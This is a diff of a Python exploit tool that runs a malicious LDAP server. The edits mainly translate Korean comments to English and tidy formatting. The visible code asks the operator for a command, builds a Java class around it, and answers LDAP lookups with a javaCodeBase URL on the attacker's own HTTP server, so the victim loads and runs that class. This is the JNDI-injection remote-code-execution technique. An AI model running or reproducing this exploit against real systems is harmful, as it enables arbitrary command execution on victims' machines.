@@ -1,4 +1,3 @@
-
 from datetime import datetime
 from termcolor import colored
 import socket
@@ -9,7 +8,7 @@ import os
 import json
 
 
-#ldap response 패킷 serializer class
+# ldap response packet serializer class
 class Serializer():
     __payload: bytes
     __sizeStack: bytes
@@ -38,13 +37,14 @@ class Serializer():
     def __repr__(self) -> str:
         return str(self.__payload)
 
-#ldap response class
+
+# ldap response class
 class LDAPResponse():
     __queryLocation: str
     __javaClassInfo: dict
 
-    #입력받은 location 및 javaClassInfo로 인스턴트 생성
-    def __init__(self, queryLocation: str, javaClassInfo:dict):
+    # Create instance location and javaClassInfo
+    def __init__(self, queryLocation: str, javaClassInfo: dict):
         self.__queryLocation = queryLocation
         self.__javaClassInfo = javaClassInfo
 
@@ -89,12 +89,12 @@ def OpenLDAPService(host, port, hport):
                         return
 
                     command = Utils.printPrompt("command", "[?] Command : ")
-                    print(colored("[+] Command was sent succefully.\n","green"))
+                    print(colored("[+] Command was sent succefully.\n", "green"))
 
                     className = Utils.randomName()
                     Generate.generateClass(command, className)
 
-                    #reponse 패킷 생성
+                    # Create response packet
                     response = LDAPResponse(queryLocation, {
                         "javaClassName": className,
                         "javaCodeBase": f"http://{host}:{hport}/",
@@ -106,11 +106,12 @@ def OpenLDAPService(host, port, hport):
                     c.recv(8096)
 
 
-                except Exception as e :
+                except Exception as e:
                     print(e)
                     print(colored('[!] Unable to exploit the connection.\n', 'red'))
-                finally :
+                finally:
                     c.close()
+
 
 if __name__ == "__main__":
     OpenLDAPService('192.168.50.119', 1111, 2222)
